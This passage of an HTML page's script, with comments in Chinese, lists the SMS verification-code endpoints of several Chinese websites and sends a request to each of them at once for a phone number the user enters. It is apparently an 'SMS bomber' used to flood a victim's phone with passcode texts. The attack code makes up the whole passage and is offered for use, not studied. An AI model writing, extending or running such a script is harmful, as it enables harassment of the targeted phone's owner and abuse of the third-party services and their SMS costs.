'http://api.gaotu100.com/user/v2/send_passcode?captcha_mode=NETEASE&type=3&mobile=$d&code_type=0'
'http://cms.51fenmi.com/api/base/public/getCode?mobile=$d'
'http://api.yinka.co/common/sms?cellphone=$d'
            ];

            // 使用 Promise.all 来批量发送请求
            Promise.all(urls.map(url => {
                // 将 $d 替换为手机号
                const apiUrl = url.replace('$d', phone);

                // 发送 GET 请求
                return fetch(apiUrl, {
                    method: 'GET',
                    headers: {
                        'Content-Type': 'application/json',
                    }
                })
                .then(response => response.json());
            }))
            .then(responses => {
                document.getElementById('response').innerHTML = responses.map((response, index) => 
                    `<h3>接口 ${index + 1} 的响应:</h3><pre>${JSON.stringify(response, null, 2)}</pre>`
                ).join('');
            })
            .catch(error => {
                console.error('有些接口调用失败：', error);
            });
        }
    </script>
</body>
